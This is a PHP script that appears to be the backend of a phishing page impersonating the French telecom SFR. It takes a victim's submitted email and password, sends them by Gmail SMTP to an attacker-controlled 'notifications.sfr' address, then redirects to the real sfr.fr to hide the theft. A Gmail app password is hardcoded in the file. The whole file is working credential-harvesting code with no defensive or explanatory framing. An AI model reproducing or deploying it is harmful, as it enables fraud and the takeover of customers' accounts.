<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

// Chemin relatif vers les fichiers PHPMailer
require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);
    $confirmPassword = htmlspecialchars($_POST['confirmPassword']);
    $captcha = htmlspecialchars($_POST['captcha']);

    if ($captcha !== '8') {
        echo "Captcha incorrect.";
        exit;
    }

    $mail = new PHPMailer(true);

    try {
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com';
        $mail->SMTPAuth = true;
        $mail->Username = 'notifications.sfr@gmail.com';
        $mail->Password = 'igkk vvej nuzf pdpt';
        $mail->SMTPSecure = 'tls';
        $mail->Port = 587;

        $mail->setFrom('notifications.sfr@gmail.com', 'Formulaire SFR');
        $mail->addAddress('notifications.sfr@gmail.com');

        $mail->Subject = 'Formulaire SFR rempli';
        $mail->Body    = "Email : $email\nMot de passe : $password\nConfirmation : $confirmPassword";

        $mail->send();

        header("Location: https://www.sfr.fr");
        exit;

    } catch (Exception $e) {
        echo "Erreur d'envoi : {$mail->ErrorInfo}";
    }
}
?>
